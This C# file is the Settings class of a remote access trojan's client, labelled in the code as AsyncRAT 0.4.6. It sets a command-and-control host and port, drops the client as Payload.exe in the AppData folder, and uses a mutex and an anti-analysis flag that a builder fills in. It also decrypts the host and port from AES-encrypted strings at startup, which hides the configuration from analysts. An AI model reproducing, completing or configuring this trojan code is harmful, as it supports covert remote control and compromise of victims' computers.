using Client.Cryptography;
using System;
using System.IO;
using System.Text;

namespace Client
{
    public static class Settings
    {
        public static string Ports = "6606";
        public static string Host = "127.0.0.1";
        public static string Version = "AsyncRAT 0.4.6";
        public static string Install = "false";
        public static string ClientFullPath = Path.Combine(Environment.ExpandEnvironmentVariables("%AppData%"), "Payload.exe");
        public static string Password = "NYAN CAT";
        public static string MTX = "%MTX%";
#if DEBUG
        public static string Anti = "false";
        public static Aes256 aes256 = new Aes256(Password);
#else
        public static readonly string Anti = "%Anti%";
        public static Aes256 aes256;
#endif


        public static bool InitializeSettings()
        {
#if DEBUG
            return true;
#endif
            try
            {
                Password = Encoding.UTF8.GetString(Convert.FromBase64String(Password));
                aes256 = new Aes256(Password);
                Ports = aes256.Decrypt(Ports);
                Host = aes256.Decrypt(Host);
                return true;
            }
            catch { return false; }
        }
    }
}